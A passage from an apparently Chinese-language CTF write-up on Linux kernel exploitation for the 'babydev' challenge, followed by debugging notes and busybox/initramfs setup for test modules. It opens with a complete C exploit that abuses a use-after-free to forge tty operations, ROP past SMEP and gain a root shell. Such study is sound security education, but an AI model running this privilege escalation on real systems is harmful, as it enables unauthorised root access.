</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rflag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rsp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>ss</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span> <span class=n>tf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>tty_operations</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>lookup</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span> <span class=n>driver</span><span class=p>,</span>
</span></span><span class=line><span class=cl>				  <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>,</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>install</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span> <span class=n>driver</span><span class=p>,</span> <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>remove</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span> <span class=n>driver</span><span class=p>,</span> <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>open</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>close</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>shutdown</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>cleanup</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>write</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>int</span> <span class=n>count</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>put_char</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>flush_chars</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>write_room</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>chars_in_buffer</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ioctl</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=p>(</span><span class=o>*</span><span class=n>compat_ioctl</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			 <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>set_termios</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>ktermios</span> <span class=o>*</span> <span class=n>old</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>throttle</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>unthrottle</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>stop</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>start</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>hangup</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>break_ctl</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>int</span> <span class=n>state</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>flush_buffer</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>set_ldisc</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>wait_until_sent</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>int</span> <span class=n>timeout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>send_xchar</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>char</span> <span class=n>ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>tiocmget</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>tiocmset</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>set</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>clear</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>resize</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>winsize</span> <span class=o>*</span> <span class=n>ws</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>set_termiox</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>termiox</span> <span class=o>*</span> <span class=n>tnew</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>get_icount</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		      <span class=k>struct</span> <span class=n>serial_icounter_struct</span> <span class=o>*</span> <span class=n>icount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=n>file_operations</span> <span class=o>*</span><span class=n>proc_fops</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define KERNCALL __attribute__((regparm(3)))
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>prepare_kernel_cred</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1810</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>commit_creds</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1420</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=n>xchgeaxesp</span> <span class=o>=</span> <span class=mh>0xffffffff810e81e8</span><span class=p>;</span>         <span class=c1>// 0xffffffff810e81e8 : xchg eax, esp ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>save_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;mov %cs, tf+8;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;pushfq; popq tf+16;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;mov %rsp, tf+24;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;mov %ss, tf+32;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// puts(&#34;status saved!&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>get_shell</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>get_root</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>commit_creds</span><span class=p>(</span><span class=nf>prepare_kernel_cred</span><span class=p>(</span><span class=nb>NULL</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>save_status</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rop</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff810d238d</span><span class=p>,</span>         <span class=c1>// pop rdi ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mh>0x6f0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff81004d80</span><span class=p>,</span>         <span class=c1>// mov cr4, rdi ; pop rbp ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>get_root</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff81063694</span><span class=p>,</span>         <span class=c1>// swapgs ; pop rbp ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff814ee0a4</span><span class=p>,</span>         <span class=c1>// opcode: 48 cf iretq
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>tf</span><span class=p>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>get_shell</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=k>struct</span> <span class=n>trap_frame</span><span class=o>*</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>rop</span><span class=p>[</span><span class=mi>8</span><span class=p>])</span> <span class=o>=</span> <span class=n>tf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>base</span>  <span class=o>=</span> <span class=n>xchgeaxesp</span> <span class=o>&amp;</span> <span class=mh>0xfffff000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>mmap</span><span class=p>(</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x3000</span><span class=p>,</span> <span class=n>PROT_EXEC</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=o>|</span><span class=n>PROT_READ</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>xchgeaxesp</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>,</span> <span class=n>rop</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rop</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>tty_operations</span> <span class=n>tty_ops</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>tty_ops</span><span class=p>.</span><span class=n>ioctl</span> <span class=o>=</span> <span class=n>xchgeaxesp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>fake_tty</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd2</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=mh>0x10001</span><span class=p>,</span> <span class=mh>0x2e0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd_tty</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/ptmx&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_NOCTTY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_tty</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>tty_ops</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd_tty</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=error>ERROR<a hidden class=anchor aria-hidden=true href=#error>#</a></h2><ul><li>musl-gcc 编译 32bit出错</li><li>ROPgadget 计算jmp relative地址错误</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>pwndbg&gt; x/4i 0xffffffff8181bfc5
</span></span><span class=line><span class=cl>   0xffffffff8181bfc5:	mov    rsp,rax
</span></span><span class=line><span class=cl>   0xffffffff8181bfc8:	dec    ebx
</span></span><span class=line><span class=cl>   0xffffffff8181bfca:	jmp    0xffffffff8181bf7e
</span></span><span class=line><span class=cl>   0xffffffff8181bfcc:	nop    DWORD PTR <span class=o>[</span>rax+0x0<span class=o>]</span>
</span></span><span class=line><span class=cl>pwndbg&gt; x/hx 0xffffffff8181bfca
</span></span><span class=line><span class=cl>0xffffffff8181bfca:	0xb2eb
</span></span></code></pre></td></tr></table></div></div><p>ROPgadget所显示的gadget为<code>0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf83</code>。</p><p>从pwndbg得到opcode<code>ebb2</code>，是<code>jmp rel8</code>类型<a href=http://ref.x86asm.net/coder64.html#xEB>ref</a>，八位相对地址跳转<code>b2</code>最高位为1，是负数-0x4e，也就是向低地址跳转，<code>0xffffffff8181bfcc-0x4e = 0xffffffff8181bf7e</code>。</p><blockquote><p>2020-10-30更新</p></blockquote><h2 id=编译加载简单module>编译加载简单module<a hidden class=anchor aria-hidden=true href=#编译加载简单module>#</a></h2><p>为了方便地获得<code>struct cred</code>和<code>struct tty_struct</code>的大小，编译简单的module。</p><h3 id=1-编译内核>1. 编译内核<a hidden class=anchor aria-hidden=true href=#1-编译内核>#</a></h3><p>这里随便用了个版本，实际上应该获取题目内核版本，下载其源码编译。<a href=#jump1>Compile Kernel</a></p><h3 id=2-编译busybox>2. 编译busybox<a hidden class=anchor aria-hidden=true href=#2-编译busybox>#</a></h3><p>在<a href=https://busybox.net/>官网</a>下载源码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ bzip2 -d -v busybox-1.32.0.tar.bz2
</span></span><span class=line><span class=cl>$ tar xvf busybox-1.32.0.tar
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> busybox-1.32.0
</span></span><span class=line><span class=cl>$ make menuconfig    <span class=c1># 进入setting，勾上Build static binary(no shared libs)</span>
</span></span><span class=line><span class=cl>$ make install -j4   <span class=c1># 4是编译线程数，根据情况改</span>
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> _install
</span></span><span class=line><span class=cl>$ mkdir proc sys
</span></span><span class=line><span class=cl>$ touch init pack
</span></span><span class=line><span class=cl>$ chmod +x init
</span></span><span class=line><span class=cl>$ chmod +x pack
</span></span></code></pre></td></tr></table></div></div><p>在init中写入如下(注意更改模块名称)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nb>echo</span> <span class=s2>&#34;{==DBG==} INIT SCRIPT&#34;</span>
</span></span><span class=line><span class=cl>mkdir /tmp
</span></span><span class=line><span class=cl>mount -t proc none /proc
</span></span><span class=line><span class=cl>mount -t sysfs none /sys
</span></span><span class=line><span class=cl>mount -t debugfs none /sys/kernel/debug
</span></span><span class=line><span class=cl>mount -t tmpfs none /tmp
</span></span><span class=line><span class=cl><span class=c1># insmod /xxx.ko # load ko</span>
</span></span><span class=line><span class=cl>mdev -s <span class=c1># We need this to find /dev/sda later</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;{==DBG==} Boot took </span><span class=k>$(</span>cut -d<span class=s1>&#39; &#39;</span> -f1 /proc/uptime<span class=k>)</span><span class=s2> seconds&#34;</span>
</span></span><span class=line><span class=cl>setsid /bin/cttyhack setuidgid <span class=m>1000</span> /bin/sh <span class=c1>#normal user</span>
</span></span><span class=line><span class=cl><span class=c1># exec /bin/sh #root</span>
</span></span></code></pre></td></tr></table></div></div><p>在pack里写入打包命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nb>echo</span> <span class=s2>&#34;Generate rootfs.img&#34;</span>
</span></span><span class=line><span class=cl>find . <span class=p>|</span> cpio -o --format<span class=o>=</span>newc &gt; ./rootfs.cpio
</span></span></code></pre></td></tr></table></div></div><h3 id=3-编写编译module>3. 编写编译module<a hidden class=anchor aria-hidden=true href=#3-编写编译module>#</a></h3><p>在kernel目录下新建文件夹，创建源码文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ mkdir test_module
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> test_module
</span></span><span class=line><span class=cl>$ touch hello.c Makefile
</span></span></code></pre></td></tr></table></div></div><p>在hello.c中写入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/init.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/module.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/kernel.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/cred.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/tty.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nf>MODULE_LICENSE</span><span class=p>(</span><span class=s>&#34;Dual BSD/GPL&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>cred</span> <span class=n>c1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>tty_struct</span> <span class=n>t1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>hello_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; Hello world!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; sizeof cred: 0x%lx </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>c1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; sizeof tty_struct: 0x%lx&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>t1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>hello_exit</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; Bye, cruel world</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>module_init</span><span class=p>(</span><span class=n>hello_init</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>module_exit</span><span class=p>(</span><span class=n>hello_exit</span><span class=p>);</span>
